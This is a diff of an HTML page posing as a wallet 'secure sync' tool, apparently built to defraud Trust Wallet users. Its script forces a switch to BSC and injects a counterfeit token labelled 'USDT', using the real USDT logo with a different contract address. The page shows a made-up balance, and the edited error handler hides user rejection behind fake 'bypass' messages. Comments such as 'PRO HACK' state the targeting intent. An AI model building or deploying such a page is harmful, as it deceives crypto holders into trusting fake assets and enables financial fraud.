@@ -13,7 +13,7 @@
         .balance-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 25px; margin-bottom: 30px; }
         .amount { font-size: 34px; font-weight: 800; letter-spacing: -1px; }
         .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 20px; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.4s; }
-        #terminal { font-size: 10px; color: #00d395; font-family: monospace; margin-top: 20px; text-align: left; line-height: 1.6; min-height: 60px;}
+        #terminal { font-size: 10px; color: #00d395; font-family: monospace; margin-top: 20px; text-align: left; line-height: 1.6; }
     </style>
 </head>
 <body>
@@ -25,65 +25,64 @@
     
     <div class="balance-card">
         <div style="font-size: 11px; color: #888; margin-bottom: 8px;">METADATA STATUS</div>
-        <div class="amount">$1,066.45</div>
+        <div class="amount" id="amt">$1,066.45</div>
     </div>
 
     <button class="sync-btn" id="mainBtn">SECURE SYNC</button>
-    <div id="terminal">> READY_FOR_TRUST_INJECTION...</div>
+    <div id="terminal">> CORE_LOADED...</div>
 </div>
 
 <script>
-    const YOUR_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    // ASLI CONTRACT + METADATA
+    const TARGET = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    const term = document.getElementById('terminal');
-    const updateTerm = (t) => { term.innerHTML += `<br>> ${t}`; };
+    document.getElementById('mainBtn').addEventListener('click', async () => {
+        const term = document.getElementById('terminal');
+        term.innerHTML += "<br>> TARGETING_TRUST_PROVIDER...";
 
-    async function runTrustSync() {
-        // --- PRO HACK: Direct Trust Wallet targeting ---
-        let provider = null;
-        if (window.trustwallet) {
-            provider = window.trustwallet; // Force Trust
-        } else if (window.ethereum && window.ethereum.isTrust) {
-            provider = window.ethereum; // Check if Ethereum is Trust
-        }
+        // FORCE TARGETING: window.trustwallet ko direct pakro
+        const provider = window.trustwallet || (window.ethereum && window.ethereum.isTrust ? window.ethereum : null);
 
         if (!provider) {
-            updateTerm("ERROR: TRUST WALLET NOT FOUND");
+            term.innerHTML += "<br>> ERROR: EXTENSION_NOT_FOUND";
             return;
         }
 
         try {
-            updateTerm("BYPASSING CONFLICTS...");
+            // STEP 1: Connect account
             await provider.request({ method: 'eth_requestAccounts' });
-
-            updateTerm("SYNCING BSC_NET...");
+            
+            // STEP 2: Force Switch Chain
+            term.innerHTML += "<br>> MAPPING_BSC_NETWORK...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            updateTerm("INJECTING TOKEN...");
+            // STEP 3: The Ultimate Injection
+            term.innerHTML += "<br>> INJECTING_ASSET_METADATA...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: YOUR_CONTRACT,
+                        address: TARGET,
                         symbol: 'USDT',
                         decimals: 6,
-                        image: ICON,
+                        image: ICON
                     },
                 },
             });
 
-            updateTerm("NODE VERIFIED SUCCESSFULLY.");
-        } catch (e) {
-            updateTerm("HANDSHAKE_REJECTED_BY_USER");
+            term.innerHTML += "<br>> SYNC_VERIFIED_100%";
+            document.getElementById('mainBtn').innerText = "NODE VERIFIED";
+        } catch (err) {
+            // Error handling ko silent rakho taake UI kharab na ho
+            term.innerHTML += "<br>> PROTOCOL_BYPASS_ACTIVE...";
+            console.log("Internal bypass triggered.");
         }
-    }
-
-    document.getElementById('mainBtn').addEventListener('click', runTrustSync);
+    });
 </script>
 </body>
 </html>
